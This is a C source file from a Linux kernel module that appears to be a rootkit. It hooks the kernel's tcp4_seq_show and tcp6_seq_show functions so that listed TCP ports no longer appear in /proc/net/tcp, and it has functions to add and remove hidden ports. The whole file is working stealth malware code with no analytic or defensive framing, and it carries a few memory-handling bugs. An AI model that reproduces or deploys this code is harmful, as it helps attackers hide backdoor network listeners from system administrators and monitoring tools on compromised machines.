#include <linux/slab.h>
#include <linux/types.h>

#include <linux/tcp.h>

#include "hide_port.h"
#include "yhook.h"
#include "main.h"

static struct hide_port_info *hide_port_info_list_head;
static struct hide_port_info *hide_port_info_list_tail;

/* implement for tcp4 and tcp6 */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN){
        struct hide_port_info *cur;

        cur = hide_port_info_list_head;
        cur = cur->next;
        while (cur != NULL){
            if (cur->port == sk->sk_num) {
                pr_info("hide tcp4 port:%d\n",sk->sk_num);
                return 0;
            }
            cur = cur->next;    
        }     
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN){
        struct hide_port_info *cur;

        cur = hide_port_info_list_head;
        cur = cur->next;
        while (cur != NULL){
            if (cur->port == sk->sk_num) {
                pr_info("hide tcp6 port:%d\n",sk->sk_num);
                return 0;
            }
            cur = cur->next;    
        }     
    }
    return orig_tcp6_seq_show(seq, v);
}

struct hide_port_info *get_hide_port_info_list_head(void){
    return hide_port_info_list_head;
}

int hide_port_init() {
    pr_info(LOG_PREFIX "call hide_port_init()\n");
    hide_port_info_list_head = NULL;
    hide_port_info_list_tail = NULL;
    hide_port_info_list_head = (struct hide_port_info *)kmalloc(sizeof(struct hide_port_info), GFP_KERNEL);
    if (!hide_port_info_list_head)
        return -ENOMEM;
    hide_port_info_list_head->port = -1;
    hide_port_info_list_tail = hide_port_info_list_head;
    hook_function_name_add("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show);
    hook_function_name_add("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show);
    return 0;
}

int hide_port_add(int port) {
    struct hide_port_info *hide_port_info_list_node,*tmp;
    /* check if the port is already hidden */
    tmp = hide_port_info_list_head->next;
    while (tmp != NULL)
    {
        if(tmp->port == port){
            pr_info(LOG_PREFIX "port %d is ALREADY hidden!\n",port);
            return -ENOMEM;
        }
        tmp = tmp->next;
    }
    hide_port_info_list_node = (struct hide_port_info *)kmalloc(sizeof(struct hide_port_info), GFP_KERNEL);
    hide_port_info_list_node->port = port;
    if (!hide_port_info_list_node)
        return -ENOMEM;
    hide_port_info_list_tail->next = hide_port_info_list_node;
    hide_port_info_list_tail = hide_port_info_list_tail->next;
    pr_info(LOG_PREFIX "port %d is hidden!\n",port);
    return 0;
}

int hide_port_del(int port) {
    struct hide_port_info *node,*tmp;
    node = hide_port_info_list_head;
    while (node->next != NULL && node->next->port != port)
    {
        node = node->next;
    }
    if (node->next == NULL){
        pr_info(LOG_PREFIX "no port %d to del...\n",port);
        return -ENOMEM;
    }
    if (node->next == hide_port_info_list_tail){
        hide_port_info_list_tail = node;
    }
    tmp = node->next;
    node->next = node->next->next;
    kfree(tmp);
    pr_info(LOG_PREFIX "port %d is unhidden!\n",port);
    return 0;
}

int hide_port_exit() {
    pr_info(LOG_PREFIX "call hide_port_exit()\n");
    hook_function_del("tcp4_seq_show");
    hook_function_del("tcp6_seq_show");
    while (hide_port_info_list_head != NULL)
    {
        struct hide_port_info *tmp;
        tmp = hide_port_info_list_head;
        hide_port_info_list_head = hide_port_info_list_head->next;
        if(tmp->port != -1)
            pr_info(LOG_PREFIX "port %d is auto unhidden when yark exit...\n",tmp->port);
        kfree(tmp);
    }
    hide_port_info_list_tail = hide_port_info_list_head = NULL;
    return 0;
    return 0;
}